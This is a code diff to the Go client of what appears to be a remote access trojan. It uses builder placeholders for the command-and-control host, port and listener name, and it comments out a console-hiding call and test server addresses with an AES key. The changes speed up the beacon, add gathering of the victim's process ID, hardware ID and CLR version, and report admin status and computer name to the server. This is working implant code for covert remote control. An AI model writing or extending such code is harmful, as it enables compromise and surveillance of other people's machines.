@@ -55,7 +55,7 @@ func (s *TCPClient) InitializeClient() {
 		TCPsocket.Send(s.Client, SendInfo())
 
 		// Implementing Timer using time package. Assuming KeepAlivePacket function exists
-		s.keepAlive = time.NewTicker(15 * time.Second)
+		s.keepAlive = time.NewTicker(8 * time.Second)
 
 		// Start a goroutine to handle the ticks
 		go func() {
@@ -113,19 +113,20 @@ func (s *TCPClient) ReadServerData() {
 		s.IsConnected = false
 	}
 }
-func checkDotNetFramework40() bool {
+func getClrVersion() string {
 	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`, registry.QUERY_VALUE)
 	if err != nil {
-		return false
+		return "v2.0" // If the registry cannot be accessed, assume CLR 2.0 is returned
 	}
 	defer key.Close()
-	release, _, err := key.GetIntegerValue("Release")
-	if err != nil {
-		return false
-	}
-	return release >= 378389
-}
 
+	// If the Release key is present, CLR 4.0 or higher is installed
+	if _, _, err := key.GetIntegerValue("Release"); err == nil {
+		return "v4.0"
+	}
+
+	return "v2.0"
+}
 func (s *TCPClient) KeepAlivePacket(conn net.Conn) {
 	msgpack := new(MessagePack.MsgPack)
 	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
@@ -148,7 +149,7 @@ func SendInfo() []byte {
 	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
 	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
 	msgpack.ForcePathObject("Admin").SetAsString(PcInfo.IsAdmin())
-	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
+	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
 	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
 	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.GetClientComputer())
 	msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
@@ -173,6 +174,7 @@ var ClientWorking bool
 
 func main() {
 
+	//Debug
 	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
 	Port := "PortAAAABBBBCCCCDDDD"
 	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
@@ -181,11 +183,14 @@ func main() {
 	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
 	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
 
-	// PcInfo.Host = "192.168.244.141"
-	// PcInfo.Port = "8000"
-	// PcInfo.ListenerName = "wd"
-	//HideConsole()
-	PcInfo.IsDotNetFour = checkDotNetFramework40()
+	//release
+	// PcInfo.Host = "192.168.1.4"
+	// PcInfo.Port = "6000"
+	// PcInfo.ListenerName = "asddw"
+	// PcInfo.AesKey = "QWERt_CSDMAHUATW"
+	PcInfo.ProcessID = PcInfo.GetProcessID()
+	PcInfo.HWID = PcInfo.GetHWID()
+	PcInfo.ClrVersion = getClrVersion()
 	ClientWorking = true
 	socket := TCPClient{}
 	socket.InitializeClient()
